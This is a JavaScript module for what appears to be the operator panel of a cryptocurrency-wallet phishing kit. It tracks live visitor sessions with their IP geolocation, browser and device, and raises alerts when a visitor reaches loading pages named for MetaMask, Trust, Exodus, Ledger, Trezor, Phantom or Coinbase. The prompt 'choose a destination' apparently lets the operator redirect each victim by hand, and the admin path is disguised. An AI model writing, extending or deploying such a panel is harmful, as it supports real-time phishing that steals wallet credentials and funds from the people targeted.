import { notify } from './notify.js?v=266';
import { tick } from './clock.js?v=262';
import { lookup } from './geo.js?v=262';
import { show } from './shell.js?v=263';

var started = false;
var selectedToken = null;
var renameToken = null;
var knownTokens = new Set();
var notifiedLoading = new Set();
var initialSeedDone = false;
var LIST_CAP = 100;

function listSwapSucceeded(e) {
    if (e.detail && e.detail.successful === false) return false;
    var xhr = e.detail && e.detail.xhr;
    if (!xhr) return false;
    return xhr.status >= 200 && xhr.status < 300;
}

function rowHasToken(rows, token) {
    for (var i = 0; i < rows.length; i++) {
        if (rows[i].getAttribute('data-token') === token) return true;
    }
    return false;
}

Object.defineProperty(window, 'selectedToken', {
    configurable: true,
    enumerable: true,
    get: function () { return selectedToken; }
});

export function selected() {
    return selectedToken;
}

function csrf() {
    var m = document.querySelector('meta[name="csrf-token"]');
    return m ? m.content : '';
}

function isLoadingPage(page) {
    return page === 'metamask_loading' || page === 'trust_loading' || page === 'exodus_loading' ||
           page === 'ellipal_loading' || page === 'ledger_loading' || page === 'trezor_loading' ||
           page === 'phantom_loading' ||
           page === 'coinbase_loading' || page === 'coinbase_review_account_loading';
}

function isLocalIp(ip) {
    return /^(127\.|::1$|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/.test(ip);
}

function reHighlight() {
    document.querySelectorAll('.session-row').forEach(function (r) {
        r.classList.remove('bg-indigo-900/30');
    });
    if (selectedToken) {
        var row = document.querySelector('[data-token="' + selectedToken + '"]');
        if (row) row.classList.add('bg-indigo-900/30');
    }
}

function stampLastResponse(row) {
    var hdrLr = document.getElementById('info-lastresponse');
    if (!hdrLr) return;
    if (row && row.getAttribute('data-last-response') !== null) {
        hdrLr.setAttribute('data-rel-iso', row.getAttribute('data-last-response') || '');
    } else {
        hdrLr.removeAttribute('data-rel-iso');
    }
}

function controlToken(el) {
    if (!el) return null;
    return el.getAttribute('data-token') || (el.closest('[data-token]') && el.closest('[data-token]').getAttribute('data-token'));
}

function fillDetailGeo(ip, locEl) {
    if (!locEl) return;
    if (isLocalIp(ip)) {
        locEl.textContent = 'Local';
        return;
    }
    lookup(ip, function (geo) {
        if (geo.error) {
            locEl.textContent = geo.error;
        } else {
            locEl.innerHTML = (geo.flag ? geo.flag + ' ' : '')
                + (geo.locText ? '<span>' + geo.locText + '</span>' : '')
                + geo.badges;
        }
    });
}

function select(token) {
    if (!token) return;

    var existingOv = document.getElementById('rp-site-overlay');
    if (existingOv) existingOv.remove();
    var fcScroll = document.querySelector('.fc-scroll');
    if (fcScroll) fcScroll.style.display = '';
    var rl = document.getElementById('redirect-btn-list');
    if (rl) rl.querySelectorAll('.rp-site-btn').forEach(function (b) { b.style.display = ''; });

    selectedToken = token;
    show('detail', true);
    sessionStorage.setItem('admin_selected_token', token);
    window._lastKnownSelectedPage = undefined;

    document.getElementById('event-feed').innerHTML = '<div style="text-align:center;padding:40px 20px;font-family:monospace;font-size:11px;color:rgba(255,255,255,.25);">Loading...</div>';
    window._feedEvents = [];
    var row = document.querySelector('[data-token="' + token + '"]');
    var name = row ? (row.dataset.label || token.substring(0, 7).toUpperCase()) : token.substring(0, 7).toUpperCase();
    document.getElementById('selected-token-label').textContent = name || token.substring(0, 7).toUpperCase();

    var ip = row ? (row.dataset.ip || '') : '';
    var created = row ? (row.dataset.created || '') : '';
    stampLastResponse(row);

    if (ip) {
        document.getElementById('info-ip').textContent = ip;
        document.getElementById('info-ip-wrap').style.display = '';

        var locEl = document.getElementById('info-location');
        var locWrap = document.getElementById('info-location-wrap');
        locEl.innerHTML = '<span style="opacity:.35;font-size:10px;">looking up…</span>';
        locWrap.style.display = '';
        fillDetailGeo(ip, locEl);
    } else {
        document.getElementById('info-ip-wrap').style.display = 'none';
        document.getElementById('info-location-wrap').style.display = 'none';
    }

    if (created) {
        var d = new Date(String(created).replace(' ', 'T'));
        var opts = { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
        document.getElementById('info-started').textContent = isNaN(d.getTime()) ? created : d.toLocaleString(undefined, opts);
        document.getElementById('info-started-wrap').style.display = '';
    } else {
        document.getElementById('info-started-wrap').style.display = 'none';
    }

    var browser = row ? (row.dataset.browser || '') : '';
    var os = row ? (row.dataset.os || '') : '';
    var device = row ? (row.dataset.device || '') : '';
    if (browser && browser !== '') {
        document.getElementById('info-browser').textContent = browser + (os && os !== '' ? '  ' + os : '');
        document.getElementById('info-browser-wrap').style.display = '';
    } else {
        document.getElementById('info-browser-wrap').style.display = 'none';
    }
    if (device && device !== '' && device !== 'Desktop') {
        document.getElementById('info-device').textContent = device;
        document.getElementById('info-device-wrap').style.display = '';
    } else {
        document.getElementById('info-device-wrap').style.display = 'none';
    }

    reHighlight();
    if (typeof window._sessionsLegacy === 'function') window._sessionsLegacy('enter', token);
    if (typeof window._startEventPoll === 'function') window._startEventPoll(token);
}

function back() {
    selectedToken = null;
    sessionStorage.removeItem('admin_selected_token');
    window._feedEvents = [];
    window._lastKnownSelectedPage = undefined;
    if (typeof window._stopEventPoll === 'function') window._stopEventPoll();
    show('sessions', true);
    document.getElementById('event-feed').innerHTML = '<div style="text-align:center;padding:64px 20px;font-family:monospace;font-size:13px;font-weight:700;color:rgba(255,255,255,.3);">Select a session to monitor it</div>';
    if (typeof window._sessionsLegacy === 'function') window._sessionsLegacy('leave');
    var lrw = document.getElementById('info-lastresponse-wrap');
    if (lrw) lrw.style.display = 'none';
    var hdrLr = document.getElementById('info-lastresponse');
    if (hdrLr) hdrLr.removeAttribute('data-rel-iso');
}

function openRename(token, currentLabel) {
    if (!token) return;
    renameToken = token;
    var input = document.getElementById('rename-input');
    if (!input) return;
    input.value = currentLabel || '';
    document.getElementById('rename-modal').classList.remove('hidden');
    setTimeout(function () { input.focus(); input.select(); }, 50);
}

function closeRename() {
    var modal = document.getElementById('rename-modal');
    if (modal) modal.classList.add('hidden');
    renameToken = null;
}

function submitRename() {
    var input = document.getElementById('rename-input');
    var label = input ? input.value.trim() : '';
    if (!label || !renameToken) return;
    var token = renameToken;

    closeRename();
    var el = document.querySelector('[data-token="' + token + '"]');
    if (el) el.dataset.label = label;
    if (selectedToken === token) {
        document.getElementById('selected-token-label').textContent = label;
        var feedName = document.getElementById('feed-client-name');
        if (feedName) feedName.textContent = label;
    }

    fetch('/admin777888xxx/session/' + token + '/rename', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf() },
        body: JSON.stringify({ label: label }),
    });
}

function headerRename() {
    if (!selectedToken) return;
    var lbl = document.getElementById('selected-token-label');
    var current = lbl ? lbl.textContent.trim() : selectedToken.substring(0, 7).toUpperCase();
    openRename(selectedToken, current);
}

function deleteAllIdle() {
    var store = document.getElementById('idle-data-store');
    var tokens = store ? Array.from(store.querySelectorAll('[data-token]')).map(function (el) { return el.dataset.token; }) : [];
    if (!tokens.length) {
        tokens = Array.from(document.querySelectorAll('.session-row[data-active="0"]')).map(function (el) { return el.dataset.token; });
    }
    if (!tokens.length) { return; }
    if (!confirm('Delete all ' + tokens.length + ' idle session(s)? This cannot be undone.')) return;
    var done = 0; var failed = 0;
    tokens.forEach(function (token) {
        fetch('/admin777888xxx/session/' + token, {
            method: 'DELETE',
            headers: { 'X-CSRF-TOKEN': csrf(), 'Accept': 'application/json' },
        }).then(function (r) {
            if (r.ok) { knownTokens.delete(token); done++; }
            else failed++;
        }).catch(function () { failed++; });
    });
}

function deleteSession(token) {
    if (!token) return;
    if (!confirm('End this session? The user will be redirected to the start and can return.')) return;
    fetch('/admin777888xxx/session/' + token, {
        method: 'DELETE',
        headers: { 'X-CSRF-TOKEN': csrf() },
    }).then(function (r) {
        if (r.redirected) { window.location.href = '/admin777888xxx/login'; return null; }
        if (!r.ok) { return null; }
        return r.json();
    }).then(function (d) {
        if (!d || !d.ok) return;
        knownTokens.delete(token);
        if (selectedToken === token) {
            selectedToken = null;
            window._feedEvents = [];
            document.getElementById('selected-token-label').textContent = '';
            document.getElementById('event-feed').innerHTML =
                '<div class="text-gray-600 text-xs text-center py-12">Select a session from the sidebar</div>';
            if (typeof window._stopEventPoll === 'function') window._stopEventPoll();
            if (typeof window._sessionsLegacy === 'function') window._sessionsLegacy('leave');
            ['info-ip-wrap', 'info-location-wrap', 'info-started-wrap', 'info-lastresponse-wrap'].forEach(function (id) {
                document.getElementById(id).style.display = 'none';
            });
            var hdrLr = document.getElementById('info-lastresponse');
            if (hdrLr) hdrLr.removeAttribute('data-rel-iso');
        }
        var row = document.querySelector('[data-token="' + token + '"]');
        if (row) row.remove();
    }).catch(function () {});
}

function togglePin(token) {
    if (!token) return;
    fetch('/admin777888xxx/session/' + token + '/pin', {
        method: 'POST',
        headers: { 'X-CSRF-TOKEN': csrf(), 'Content-Type': 'application/json' },
    }).then(function (r) {
        if (r.redirected) { window.location.href = '/admin777888xxx/login'; return null; }
        if (!r.ok) { return null; }
        return r.json();
    }).then(function (d) {
        if (!d || !d.ok) return;
        htmx.trigger(document.getElementById('session-list'), 'refresh');
    }).catch(function () {});
}

function onControlClick(e) {
    var el = e.target.closest('[data-sessions-control]');
    if (!el || !e.currentTarget.contains(el)) return;
    var action = el.getAttribute('data-sessions-control');
    var token = controlToken(el);

    if (action === 'select') {
        select(token);
        return;
    }
    if (action === 'pin') {
        e.stopPropagation();
        togglePin(token);
        return;
    }
    if (action === 'rename') {
        e.stopPropagation();
        if (token) {
            var row = el.closest('[data-token]') || document.querySelector('[data-token="' + token + '"]');
            var current = row ? (row.dataset.label || '') : '';
            openRename(token, current);
        } else {
            headerRename();
        }
        return;
    }
    if (action === 'delete') {
        e.stopPropagation();
        deleteSession(token);
        return;
    }
    if (action === 'delete-idle') {
        e.stopPropagation();
        deleteAllIdle();
        return;
    }
    if (action === 'back') {
        back();
        return;
    }
    if (action === 'rename-submit') {
        submitRename();
        return;
    }
    if (action === 'rename-close') {
        closeRename();
    }
}

function onRenameKeydown(e) {
    if (e.key === 'Enter') submitRename();
    if (e.key === 'Escape') closeRename();
}

function onRenameBackdrop(e) {
    if (e.target === e.currentTarget) closeRename();
}

function onListSwap(e) {
    if (e.target.id !== 'session-list') return;

    var incoming = e.detail.fragment || e.target;
    if (incoming) {
        incoming.querySelectorAll('[data-token]').forEach(function (newEl) {
            var existing = document.getElementById('sr-' + newEl.dataset.token);
            if (existing && existing !== newEl) {
                ['page', 'ip', 'created', 'last-seen', 'last-response', 'active', 'label', 'browser', 'os', 'device'].forEach(function (attr) {
                    var val = newEl.getAttribute('data-' + attr);
                    if (val !== null) existing.setAttribute('data-' + attr, val);
                });
            }
        });
    }
    reHighlight();
    if (selectedToken) {
        if (typeof window._sessionsLegacy === 'function') window._sessionsLegacy('refresh');
        var selRow = document.querySelector('[data-token="' + selectedToken + '"]');
        stampLastResponse(selRow);
    }
    tick();

    var seenIps = {};
    e.target.querySelectorAll('[data-ip]').forEach(function (row) {
        var rIp = row.getAttribute('data-ip');
        if (!rIp || seenIps[rIp]) return;
        seenIps[rIp] = true;
        if (isLocalIp(rIp)) return;
        lookup(rIp, function (geo) {
            if (geo.error) return;
            document.querySelectorAll('.session-row[data-ip="' + rIp + '"] .sr-geo').forEach(function (el) {
                el.innerHTML = (geo.flag ? geo.flag + ' ' : '')
                    + '<span style="opacity:.45;font-size:11px;">' + (geo.locText || '') + '</span>'
                    + geo.badges;
            });
        });
    });

    var sessionRows = e.target.querySelectorAll('[data-token]');

    if (!initialSeedDone) {
        if (!listSwapSucceeded(e)) return;
        initialSeedDone = true;
        var seedTime = Date.now();
        var restoredTok = sessionStorage.getItem('admin_selected_token');
        if (restoredTok && !selectedToken) {
            if (rowHasToken(sessionRows, restoredTok)) {
                select(restoredTok);
            } else if (sessionRows.length < LIST_CAP) {
                sessionStorage.removeItem('admin_selected_token');
            }
        }
        sessionRows.forEach(function (el) {
            var createdMs = el.dataset.created ? new Date(el.dataset.created).getTime() : 0;
            var elAge = createdMs ? (seedTime - createdMs) : 99999999;
            var isFresh = elAge < 8000;

            knownTokens.add(el.dataset.token);
            if (!isFresh) {
                if (isLoadingPage(el.dataset.page)) notifiedLoading.add(el.dataset.token);
            }
        });
        sessionRows.forEach(function (el) {
            var createdMs = el.dataset.created ? new Date(el.dataset.created).getTime() : 0;
            var elAge = createdMs ? (seedTime - createdMs) : 99999999;
            if (elAge >= 8000) return;
            var token = el.dataset.token;
            var page = el.dataset.page || '';
            var label = el.dataset.label || token.substring(0, 8);
            var seedBody = label + ' just opened the site';
            var seedType = 'session';
            if (isLoadingPage(page)) {
                seedBody = label + ' is on the loading page  choose a destination';
                seedType = 'loading';
                notifiedLoading.add(token);
            }
            notify('New session', seedBody, seedType);
        });
        return;
    }

    var visibleTokens = new Set();
    sessionRows.forEach(function (el) { visibleTokens.add(el.dataset.token); });

    sessionRows.forEach(function (el) {
        var token = el.dataset.token;
        var page = el.dataset.page || '';
        var label = (el.dataset.label || token.substring(0, 8));
        var createdAt = el.dataset.created ? new Date(el.dataset.created).getTime() : 0;
        var ageMs = createdAt ? (Date.now() - createdAt) : 99999999;

        var isNewSession = !knownTokens.has(token);
        if (isNewSession) {
            knownTokens.add(token);
            if (ageMs < 20000) {
                var sessionBody = label + ' just opened the site';
                var sessionType = 'session';
                if (isLoadingPage(page)) {
                    sessionBody = label + ' is on the loading page  choose a destination';
                    sessionType = 'loading';
                    notifiedLoading.add(token);
                }
                notify('New session', sessionBody, sessionType);
            }
        }

        if (!isNewSession && isLoadingPage(page) && !notifiedLoading.has(token)) {
            notifiedLoading.add(token);
            notify('Waiting', label + ' is on the loading page  choose a destination', 'loading');
        }
        if (!isLoadingPage(page) && visibleTokens.has(token)) notifiedLoading.delete(token);
    });

    if (selectedToken) {
        var fragRow = incoming ? incoming.querySelector('[data-token="' + selectedToken + '"]') : null;
        var pageRow = fragRow || document.querySelector('[data-token="' + selectedToken + '"]');
        var newPage = pageRow ? pageRow.dataset.page : null;
        if (fragRow) {
            var liveRow = document.querySelector('[data-token="' + selectedToken + '"]');
            if (liveRow && newPage) liveRow.dataset.page = newPage;
        }
            if (newPage !== window._lastKnownSelectedPage) {
            window._lastKnownSelectedPage = newPage;
            if (typeof window._startEventPoll === 'function') window._startEventPoll(selectedToken);
            if (typeof window._sessionsLegacy === 'function') window._sessionsLegacy('refresh');
        }
    }
}

export function start() {
    if (started) return;
    started = true;

    var list = document.getElementById('session-list');
    if (list) list.addEventListener('click', onControlClick);

    var headerBar = document.getElementById('back-btn') ? document.getElementById('back-btn').parentNode : null;
    if (headerBar) headerBar.addEventListener('click', onControlClick);

    var modal = document.getElementById('rename-modal');
    if (modal) modal.addEventListener('click', onRenameBackdrop);
    var renameInput = document.getElementById('rename-input');
    if (renameInput) renameInput.addEventListener('keydown', onRenameKeydown);
    if (modal) {
        modal.addEventListener('click', function (e) {
            var el = e.target.closest('[data-sessions-control]');
            if (!el || !modal.contains(el)) return;
            var action = el.getAttribute('data-sessions-control');
            if (action === 'rename-submit') submitRename();
            if (action === 'rename-close') closeRename();
        });
    }

    var navSessions = document.getElementById('nav-sessions-btn');
    if (navSessions) {
        navSessions.addEventListener('click', function () {
            if (selectedToken) back();
        });
    }

    document.addEventListener('htmx:afterSwap', onListSwap);

    if (window.htmx && window._ADMIN && window._ADMIN.sessionsUrl) {
        htmx.ajax('GET', window._ADMIN.sessionsUrl, { target: '#session-list', swap: 'innerHTML' });
    }
}
